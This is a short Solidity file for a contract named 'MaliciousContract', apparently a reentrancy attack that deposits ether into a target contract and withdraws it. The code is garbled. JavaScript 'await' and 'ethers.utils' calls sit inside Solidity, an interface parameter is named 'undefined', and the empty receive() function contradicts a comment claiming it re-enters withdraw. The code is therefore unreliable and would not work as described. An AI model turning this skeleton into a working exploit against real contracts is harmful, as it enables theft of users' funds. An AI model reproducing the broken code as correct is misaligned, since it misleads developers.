
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IVulnerableContract {
        function balances(address undefined) external returns (uint256);
    function deposit() external payable;
    function withdraw() external;
    }

    contract MaliciousContract {
        IVulnerableContract public vulnerableContract;

        constructor(address _vulnerableContractAddress) {
            vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
        }

        function attack() external payable {
            // Assuming the contract has deposit and withdraw functions
await vulnerableContract.deposit({value: ethers.utils.parseEther("1")});
await vulnerableContract.withdraw();
// The malicious contract's receive function will automatically attempt to withdraw again if there's a balance

        }

        receive() external payable {
            // Add fallback logic if needed
        }
    }
    